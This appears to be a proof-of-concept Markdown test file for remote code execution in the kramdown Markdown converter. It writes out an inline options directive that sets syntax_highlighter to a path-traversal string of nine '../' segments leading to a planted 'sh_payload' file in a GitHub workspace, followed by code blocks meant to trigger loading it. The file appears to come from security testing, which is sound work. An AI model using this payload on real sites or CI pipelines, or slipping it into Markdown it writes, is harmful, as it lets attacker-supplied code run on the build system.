---
---

# Test 25: Clean syntax_highlighter RCE (no ERB)

This test uses ONLY the syntax_highlighter option via inline options.
No ERB template is used. If sh-rce-proof.txt appears, it proves
the require path traversal via syntax_highlighter works independently.

The traversal needs 9 ../ to reach root from kramdown/converter/syntax_highlighter/
then github/workspace/sh_payload to load our file.

{::options syntax_highlighter="../../../../../../../../../github/workspace/sh_payload" /}

```ruby
# This code block triggers syntax highlighter loading
x = 1 + 1
```

```python
# Second code block as backup trigger
print("hello")
```
